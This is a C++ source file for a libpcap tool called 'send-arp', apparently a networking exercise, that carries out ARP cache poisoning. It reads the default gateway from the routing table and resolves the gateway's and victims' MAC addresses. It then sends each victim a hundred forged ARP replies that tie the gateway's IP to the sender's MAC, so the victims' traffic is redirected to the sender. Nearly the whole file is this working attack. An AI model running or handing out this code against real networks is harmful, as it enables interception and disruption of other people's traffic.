#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/rtnetlink.h>
#include <unistd.h>
#include <arpa/inet.h>


#define BUFSIZE 8192
unsigned char cMacAddr[8]; // Server's MAC address

static int GetSvrMacAddress( char *pIface )
{
    int nSD; // Socket descriptor
    struct ifreq sIfReq; // Interface request
    struct if_nameindex *pIfList; // Ptr to interface name index
    struct if_nameindex *pListSave; // Ptr to interface name index

    pIfList = (struct if_nameindex *)NULL;
    pListSave = (struct if_nameindex *)NULL;

    #ifndef SIOCGIFADDR
    // The kernel does not support the required ioctls
    return( 0 );
    #endif

    nSD = socket( PF_INET, SOCK_STREAM, 0 );
    if ( nSD < 0 )
    {
        printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
        return( 0 );
    }

    pIfList = pListSave = if_nameindex();

    for ( pIfList; *(char *)pIfList != 0; pIfList++ )
    {
        if ( strcmp(pIfList->if_name, pIface) )
            continue;
        strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );

        if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
        {
            printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
            return( 0 );
        }

        memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
        break;
    }

    if_freenameindex( pListSave );
        close( nSD );
        return( 1 );
}

struct route_info

{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};

int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do
    {
        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
        {
            perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
        {
            perror("Error in recieved packet");
            return -1;
        }
        if(nlHdr->nlmsg_type == NLMSG_DONE)
        {
            break;
        }
        else
        {
            bufPtr += readLen;
            msgLen += readLen;
        }

        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)

        {
            break;
        }
    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)

{
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen))
    {
        switch(rtAttr->rta_type)
        {
            case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;
            case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            break;
            case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            break;
            case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            break;
        }
    }
    return;

}

int get_gatewayip(char *gatewayip, socklen_t size)

{
    int found_gatewayip = 0;

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;

    char msgBuf[BUFSIZE]; // pretty large buffer

    int sock, len, msgSeq = 0;

    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)

    {
        perror("Socket Creation: ");
        return(-1);
    }

    memset(msgBuf, 0, BUFSIZE);

    nlMsg = (struct nlmsghdr *)msgBuf;

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.

    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.

    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.

    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)

    {
        fprintf(stderr, "Write To Socket Failed...\n");
        return -1;
    }

    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
    {
        fprintf(stderr, "Read From Socket Failed...\n");
        return -1;
    }
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len))
    {
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0"))

        {
            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            found_gatewayip = 1;
            break;
        }
    }

    free(rtInfo);
    close(sock);

    return found_gatewayip;
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct{
    u_int8_t eth_dmac[6];
    u_int8_t eth_smac[6];
    u_int8_t eth_type[2];

    u_int8_t arp_hrd[2];
    u_int8_t arp_type[2];
    u_int8_t arp_hrdl;
    u_int8_t arp_protl;
    u_int8_t arp_op[2];
    u_int8_t arp_smac[6];
    u_int8_t arp_sip[4];
    u_int8_t arp_tmac[6];
    u_int8_t arp_tip[4];
}My_Arp;

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return -1;
	}

    int count = argc/2-1;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    char gateway[20];
    char gateway_mac[20];
    struct ifreq ifr;
    char ipstr[20];
    int s;

    char my_IP[20];
    char my_MAC[20];
    char victim_IP[10][20];
    char victim_MAC[10][20];
    char target_IP[10][20];

    char arp_sip_tmp[20];
    int res;
    struct pcap_pkthdr* header;
    const u_char* packet_rcv;
    My_Arp * arp_packet;
    EthArpPacket packet;
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
    if ( !GetSvrMacAddress("eth0") )
    {
    printf( "Fatal error: Failed to get local host's MAC address\n" );
    }

    //my_MAC
    sprintf(my_MAC, "%02X:%02X:%02X:%02X:%02X:%02X",cMacAddr[0], cMacAddr[1], cMacAddr[2],
            cMacAddr[3], cMacAddr[4], cMacAddr[5]);

    //gateway = gateway_IP
    get_gatewayip(gateway, 20);
    printf("gateway : %s\n",gateway);


    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        printf("Error\n");
    }
    else
    {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
        //my_IP
        sprintf(my_IP, "%s", ipstr);
    }

    printf("my IP, MAC : %s %s\n",my_IP,my_MAC);


    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//06:7A:0E:01:33:8F , 2C:8D:B1:E8:E1:E9
    packet.eth_.smac_ = Mac(my_MAC);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 2Bytes
    packet.arp_.pro_ = htons(EthHdr::Ip4);      // 2Bytes
    packet.arp_.hln_ = Mac::SIZE;               // 1Bytes
    packet.arp_.pln_ = Ip::SIZE;                // 1Btyes
    packet.arp_.op_ = htons(ArpHdr::Request);     // 0001 : request, 0002 : reply
    packet.arp_.smac_ = Mac(my_MAC);//my MAC
    packet.arp_.sip_ = htonl(Ip(my_IP));//my IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//gateway MAC -> Unknown MAC
    packet.arp_.tip_ = htonl(Ip(gateway));// gateway IP

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "1st pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(true){
        res = pcap_next_ex(pcap, &header, &packet_rcv);
        if (res == 0) continue;

        arp_packet =(My_Arp*)packet_rcv;
        inet_ntop(AF_INET,arp_packet->arp_sip,arp_sip_tmp,sizeof(arp_sip_tmp));

        if(arp_packet->arp_op[1] == 2 && !strcmp(arp_sip_tmp,gateway)){
            sprintf(gateway_mac,"%02X:%02X:%02X:%02X:%02X:%02X",arp_packet->arp_smac[0],
                    arp_packet->arp_smac[1],arp_packet->arp_smac[2],arp_packet->arp_smac[3]
                    ,arp_packet->arp_smac[4],arp_packet->arp_smac[5]);
            break;
        }
    }

    printf("gateway_mac : %s\n", gateway_mac);
//victim's ip -> mac
    for(int i=0;i<count;i++){
        strcpy(victim_IP[i],argv[(i+1)*2]);
        strcpy(target_IP[i],argv[(i+1)*2+1]);

        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//06:7A:0E:01:33:8F , 2C:8D:B1:E8:E1:E9
        packet.eth_.smac_ = Mac(my_MAC);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 2Bytes
        packet.arp_.pro_ = htons(EthHdr::Ip4);      // 2Bytes
        packet.arp_.hln_ = Mac::SIZE;               // 1Bytes
        packet.arp_.pln_ = Ip::SIZE;                // 1Btyes
        packet.arp_.op_ = htons(ArpHdr::Request);     // 0001 : request, 0002 : reply
        packet.arp_.smac_ = Mac(my_MAC);//my MAC
        packet.arp_.sip_ = htonl(Ip(my_IP));//my IP
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//Unknown MAC
        packet.arp_.tip_ = htonl(Ip(victim_IP[i]));// victim IP

        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "3rd pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        while(true){
            res = pcap_next_ex(pcap, &header, &packet_rcv);
            if (res == 0) continue;

            arp_packet =(My_Arp*)packet_rcv;
            inet_ntop(AF_INET,arp_packet->arp_sip,arp_sip_tmp,sizeof(arp_sip_tmp));

            if(arp_packet->arp_op[1] == 2 && !strcmp(arp_sip_tmp,victim_IP[i])){ // reply, src mac == victim mac
                sprintf(victim_MAC[i],"%02X:%02X:%02X:%02X:%02X:%02X",arp_packet->arp_smac[0],
                        arp_packet->arp_smac[1],arp_packet->arp_smac[2],arp_packet->arp_smac[3]
                        ,arp_packet->arp_smac[4],arp_packet->arp_smac[5]);
                break;
            }
        }
    }
    int a=100;
    while(a--){
        for(int i=0;i<count;i++){
            packet.eth_.dmac_ = Mac(victim_MAC[i]);//06:7A:0E:01:33:8F , 2C:8D:B1:E8:E1:E9
            packet.eth_.smac_ = Mac(my_MAC);
            packet.eth_.type_ = htons(EthHdr::Arp);

            packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 2Bytes
            packet.arp_.pro_ = htons(EthHdr::Ip4);      // 2Bytes
            packet.arp_.hln_ = Mac::SIZE;               // 1Bytes
            packet.arp_.pln_ = Ip::SIZE;                // 1Btyes
            packet.arp_.op_ = htons(ArpHdr::Reply);     // 0001 : request, 0002 : reply
            packet.arp_.smac_ = Mac(my_MAC);//my MAC
            packet.arp_.sip_ = htonl(Ip(gateway));//my IP
            packet.arp_.tmac_ = Mac(victim_MAC[i]);//victim MAC
            packet.arp_.tip_ = htonl(Ip(victim_IP[i]));// victim IP

            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "3rd pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        sleep(1);
    }


    pcap_close(handle);
    pcap_close(pcap);

    printf("end\n");

    return 0;
}
